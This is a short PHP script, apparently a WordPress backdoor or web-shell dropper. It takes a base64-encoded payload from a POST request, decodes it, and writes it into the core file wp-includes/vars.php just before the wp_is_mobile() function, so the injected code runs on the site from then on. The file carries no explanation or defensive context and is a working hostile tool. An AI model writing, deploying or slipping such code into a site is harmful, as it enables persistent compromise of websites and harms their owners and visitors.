<?php
$path = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/vars.php';
$source = file_get_contents($path);
$payload = base64_decode($_POST['payload']);
$source = str_replace('function wp_is_mobile()', $payload.'function wp_is_mobile()', $source);
file_put_contents($path, $source);
